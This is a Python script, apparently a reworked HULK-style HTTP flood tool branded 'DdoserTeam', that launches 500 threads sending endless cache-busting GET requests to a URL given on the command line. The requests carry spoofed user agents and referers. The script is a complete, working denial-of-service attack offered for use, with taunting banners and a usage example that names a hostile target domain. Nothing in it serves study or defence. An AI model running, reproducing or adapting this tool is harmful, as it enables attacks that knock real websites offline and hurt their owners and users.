import urllib2
import sys
import threading
import random
import re

#global params
url=''
host=''
headers_useragents=[]
headers_referers=[]
request_counter=0
flag=0
safe=0

def inc_counter():
	global request_counter
	request_counter+=1

def set_flag(val):
	global flag
	flag=val

def set_safe():
	global safe
	safe=1
	
# generates a user agent array
def useragent_list():
	global headers_useragents
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	return(headers_useragents)

# generates a referer array
def referer_list():
	global headers_referers
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.usatoday.com/search/results?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('http://' + host + '/')
	return(headers_referers)
	
#builds random ascii string
def buildblock(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 90)
		out_str += chr(a)
	return(out_str)

def usage():
	print '---------------------------------------------------'
	print 'USAGE: python ddoserteam.py url : http://www.israelfuck.com/'
	print 'The DdoserTeam Created by : MISTER_D'
	print "\a"
print \
"""            _________
              |     /$$$$$$$  /$$$$$$$  Windows <cmd/python> /$$$$$$      
     -------|    | $$__  $$| $$__  $$           /$$__  $$    |-------
            |    | $$  \ $$| $$  \ $$  /$$$$$$ | $$  \__/    | 
            |    | $$  | $$| $$  | $$ /$$__  $$|  $$$$$$     | 
     -------|    | $$  | $$| $$  | $$| $$  \ $$ \____  $$    |------- 
            |    | $$  | $$| $$  | $$| $$  | $$ /$$  \ $$    | 
            |    | $$$$$$$/| $$$$$$$/|  $$$$$$/|  $$$$$$/    | 
     -------|    |_______/ |_______/  \______/  \______/     |-------
            |____________[DDOSER TEAM ATTACK]____________|
     	      d' Hb         
      	     d'  H`b
            d'   `b`b
           d'     H `b
          d'      `b `b
         d'           `b
        d'             `b  /$$$$$$  /$$$$$$$   /$$$$$$   /$$$$$$  /$$$$$$$$ /$$$$$$$$ /$$$$$$$ 
       /$$__  $$| $$__  $$ /$$__  $$ /$$__  $$| $$_____/| $$_____/| $$__  $$
      | $$  \__/| $$  \ $$| $$  \ $$| $$  \ $$| $$      | $$      | $$  \ $$
      |  $$$$$$ | $$$$$$$/| $$  | $$| $$  | $$| $$$$$   | $$$$$   | $$  | $$
       \____  $$| $$____/ | $$  | $$| $$  | $$| $$__/   | $$__/   | $$  | $$
       /$$  \ $$| $$      | $$  | $$| $$  | $$| $$      | $$      | $$  | $$
      |  $$$$$$/| $$      |  $$$$$$/|  $$$$$$/| $$      | $$$$$$$$| $$$$$$$/
       \______/ |__/       \______/  \______/ |__/      |________/|_______/ 
                         /$$   /$$ /$$$$$$$  /$$$$$$$                       
                        | $$  | $$| $$__  $$| $$__  $$  	>Mister_D<              
                        | $$  | $$| $$  \ $$| $$  \ $$  	>MrZucker404<                    
                        | $$  | $$| $$  | $$| $$$$$$$/  	>Bhenot<                    
                        | $$  | $$| $$  | $$| $$____/   	>Skyline<                    
                        | $$  | $$| $$  | $$| $$        	>MrRandom<                    
                        |  $$$$$$/| $$$$$$$/| $$        	>CyberArt501<                 
                         \______/ |_______/ |__/        	>GhostXA<                    
______________________________________________________________________________

"""
print '---------------------------------------------------'

	
#http request
def httpcall(url):
	useragent_list()
	referer_list()
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
 			print 'BY MISTER_D AND DDOSER_TEAM HAHAHA SISTEM KEAMANAN DATABASE ANDA SANGAT LEMAH SEKALI BUNG :v :p'
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

	
#http caller thread 
class HTTPThread(threading.Thread):
	def run(self):
		try:
			while flag<2:
				code=httpcall(url)
				if (code==500) & (safe==1):
					set_flag(2)
		except Exception, ex:
			pass

# monitors http threads and counts requests
class MonitorThread(threading.Thread):
	def run(self):
		previous=request_counter
		while flag==0:
			if (previous+100<request_counter) & (previous<>request_counter):
				print "%d Shots sends Senting" % (request_counter)
				previous=request_counter
		if flag==2:
			print "\n -MISTER_D Hits are secced"

#execute 
if len(sys.argv) < 2:
	usage()
	sys.exit()
else:
	if sys.argv[1]=="help":
		usage()
		sys.exit()
	else:
		print "Ddoser_Team attack was been sended This tool is created by : MISTER_D"
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
		if url.count("/")==2:
			url = url + "/"
		m = re.search('http\://([^/]*)/?.*', url)
		host = m.group(1)
		for i in range(500):
			t = HTTPThread()
			t.start()
		t = MonitorThread()
		t.start()
